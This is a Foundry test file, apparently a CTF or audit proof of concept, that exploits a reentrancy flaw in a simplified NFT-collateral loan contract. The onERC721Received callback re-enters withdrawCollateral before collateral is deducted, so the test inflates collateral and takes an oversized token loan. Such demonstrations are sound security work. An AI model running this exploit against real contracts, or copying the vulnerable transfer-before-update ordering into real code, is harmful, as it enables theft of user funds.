// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";

contract HalbornLoansFixedGetLoanInequality {
    // ... simplified for demo

    HalbornToken public token;
    HalbornNFT public nft;

    uint256 public immutable collateralPrice;

    mapping(address => uint256) public totalCollateral;
    mapping(address => uint256) public usedCollateral;
    mapping(uint256 => address) public idsCollateral;

    constructor(uint256 collateralPrice_) {
        collateralPrice = collateralPrice_;
    }

    function initialize(address token_, address nft_) public {
        token = HalbornToken(token_);
        nft = HalbornNFT(nft_);
    }

    function depositNFTCollateral(uint256 id) external {
        require(nft.ownerOf(id) == msg.sender, "Caller is not the owner of the NFT");
        nft.safeTransferFrom(msg.sender, address(this), id);
        totalCollateral[msg.sender] += collateralPrice;
        idsCollateral[id] = msg.sender;
    }

    function withdrawCollateral(uint256 id) external {
        require(totalCollateral[msg.sender] - usedCollateral[msg.sender] >=  collateralPrice, "Collateral unavailable");
        require(idsCollateral[id] == msg.sender, "ID not deposited by caller");
        nft.safeTransferFrom(address(this), msg.sender, id);
        totalCollateral[msg.sender] -= collateralPrice;
        delete idsCollateral[id];
    }

    function getLoan(uint256 amount) external {
        // NOTE: fixed the inequality for the demo
        require(totalCollateral[msg.sender] - usedCollateral[msg.sender] >= amount, "Not enough collateral");
        usedCollateral[msg.sender] += amount;
        token.mintToken(msg.sender, amount);
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract HalbornTestReentrancy is Test {
    address public immutable ALICE = makeAddr("ALICE");

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoansFixedGetLoanInequality public loans;

    function setUp() public {
        nft = new HalbornNFT();
        nft.initialize("", 1 ether);
        token = new HalbornToken();
        token.initialize();
        loans = new HalbornLoansFixedGetLoanInequality(2 ether); // incentivize reentrancy
        loans.initialize(address(token), address(nft));
        token.setLoans(address(loans));
    }

    uint count = 0;
    uint curTotal;
    uint[] public ids;

    function testReentrancy() public {
        // start with 1 NFT
        console.log("--> Starting with 1 ether");
        nft.mintBuyWithETH{value: 1 ether}();    
        uint id = nft.idCounter();

        // farm the price difference and repeat the reentrancy
        nft.approve(address(loans), id);
        loans.depositNFTCollateral(id);
        loans.withdrawCollateral(id);   

        // deposit all the NFTs and get a loan
        console.log("--> Depositing all NFTs");
        for (uint i = 0; i < ids.length; i++) {
            uint curId = ids[i];
            nft.approve(address(loans), curId);
            console.log("  Depositing NFT id:", curId);
            loans.depositNFTCollateral(curId);
        }

        loans.getLoan(loans.totalCollateral(address(this))); 

        console.log("--> Loan gotten:", loans.usedCollateral(address(this)) / 1e18, "ether worth of HalbornTokens");
    }

    function onERC721Received(address operator, address, uint256, bytes memory) public  returns (bytes4) {
        if (address(operator) == address(loans)) {
            curTotal = loans.totalCollateral(address(this));

            console.log("* Reentrancy count:", count);

            if (count < 10) {            
                count++;
                console.log("  totalCollateral:", curTotal / 1e18, "ether");

                // buy another NFT
                nft.mintBuyWithETH{value: 1 ether}();
                uint curId = nft.idCounter();
                ids.push(curId);
                console.log("  Bought another NFT, id:", curId);

                // farm the price difference and repeat the reentrancy
                nft.approve(address(loans), curId);
                loans.depositNFTCollateral(curId);
                loans.withdrawCollateral(curId);
            }        
        }

        return this.onERC721Received.selector;
    }
}
